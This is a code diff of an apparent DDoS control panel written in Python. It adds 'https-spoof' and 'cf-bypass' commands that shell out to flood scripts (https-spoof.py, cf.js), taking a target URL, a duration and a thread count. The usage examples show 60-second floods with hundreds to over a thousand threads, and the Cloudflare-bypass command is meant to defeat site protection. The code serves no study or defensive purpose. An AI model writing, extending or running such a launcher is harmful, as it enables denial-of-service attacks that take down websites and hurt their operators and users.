@@ -84,16 +84,16 @@ def main():
         elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
             ()
 
-        elif "http-socket" in cnc:
+        elif "https-spoof" in cnc:
             try:
                 url = cnc.split()[1]
-                per = cnc.split()[2]
-                time = cnc.split()[3]
-                os.system(f'node HTTP-SOCKET {url} {per} {time}')
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'python3 https-spoof.py {url} {time} {thread}')
             except IndexError:
-                print(Fore.LIGHTCYAN_EX +'Usage: http-socket <url> <per> <time>')
-                print(Fore.LIGHTCYAN_EX +'Example: http-socket http://LeMinhTu.info/ 5000 60')
-
+                print('Usage: https-spoof <url> <time> <threads>')
+                print('Example: https-spoof http://LeMinhTu.info 60 500')
+                
         elif "http-raw" in cnc:
             try:
                 url = cnc.split()[1]
@@ -145,6 +145,16 @@ def main():
             except IndexError:
                 print(Fore.RED +'Usage: attack <url> METHODS<GET/POST>')
                 print(Fore.RED +'Example: attack http://LeMinhTu.info/ GET')
+        
+        elif "cf-bypass" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'node cf.js {url} {time} {thread}')
+            except IndexError:
+                print('Usage: cf-bypass <url> <time> <threads>')
+                print('Example: cf-bypass http://example.com 60 1250')
 
         elif "info" in cnc:
             print(f'''
